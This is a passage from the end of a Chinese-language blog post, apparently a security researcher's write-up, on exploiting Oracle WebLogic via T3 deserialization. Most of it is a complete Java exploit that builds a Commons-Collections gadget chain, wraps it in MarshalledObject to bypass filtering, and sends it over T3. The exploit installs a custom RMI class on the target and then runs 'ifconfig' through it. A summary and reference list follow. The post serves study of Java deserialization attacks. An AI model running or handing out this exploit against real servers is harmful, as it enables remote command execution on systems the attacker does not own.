53, 0, 58, 0, 0, 0, 4, 0, 1, 0, 59, 0, 1, 0, 81, 0, 0, 0, 2, 0, 82,
    };

    public static void main(String[] args) {
        try {
            String url = "t3://" + host + ":" + port;
            // 安装RMI实例
            invokeRMI(classname, bs);

            Environment environment = new Environment();
            environment.setProviderUrl(url);
            environment.setEnableServerAffinity(false);
            environment.setSSLClientTrustManager(new WeblogicTrustManager());
            Context context = environment.getInitialContext();
            ClusterMasterRemote remote = (ClusterMasterRemote) context.lookup("Y4er");

            // 调用RMI实例执行命令
            String res = remote.getServerLocation("ifconfig");
            System.out.println(res);
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static void invokeRMI(String className, byte[] clsData) throws Exception {
        // common-collection1 构造transformers 定义自己的RMI接口
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(DefiningClassLoader.class),
            new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
            new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
            new InvokerTransformer("defineClass",
                                   new Class[]{String.class, byte[].class}, new Object[]{className, clsData}),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{null}}),
            new ConstantTransformer(new HashSet())};

        final Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        InvocationHandler handler = (InvocationHandler) Reflections
            .getFirstCtor(
            "sun.reflect.annotation.AnnotationInvocationHandler")
            .newInstance(Override.class, lazyMap);

        final Map mapProxy = Map.class
            .cast(Proxy.newProxyInstance(SerialDataGenerator.class.getClassLoader(),
                                         new Class[]{Map.class}, handler));

        handler = (InvocationHandler) Reflections.getFirstCtor(
            "sun.reflect.annotation.AnnotationInvocationHandler")
            .newInstance(Override.class, mapProxy);

        // 序列化数据 MarshalledObject绕过
        Object obj = new MarshalledObject(handler);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(out);
        objOut.writeObject(obj);
        objOut.flush();
        objOut.close();
        byte[] payload = out.toByteArray();
        // t3发送
        T3ProtocolOperation.send(host, port, payload);
    }
}
```
根据weblogic_cmd的代码整理为一个文件，其中T3部分仍使用weblogic_cmd的代码，效果如下：

![image](https://y4er.com/img/uploads/20200216011826.png)

## 总结
weblogic是一个体型庞大的中间件，而common-collection反序列化能做的东西太多了，灵活运用反射来调用weblogic的各种内置类，可以达到你想要的任何目的。在写这篇文章的时候，很多东西都是我之前没有接触过的，理解起来很难，一点一点的学习、吃透这个东西，还是很有成就感的。学习是一个很愉快的过程，但进步不是，共勉吧。

## 参考链接
https://www.cnblogs.com/javalouvre/p/3726256.html
http://jxzhuge12.me/2016/04/11/Java-rmi-case/
https://javasec.org/javase/ClassLoader/
https://javasec.org/javase/RMI/
https://github.com/5up3rc/weblogic_cmd
https://gist.github.com/jjf012/8736ffd658298c769317643643fc3750
https://www.cnblogs.com/afanti/
Java安全漫谈(RMI系列).pdf

**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**

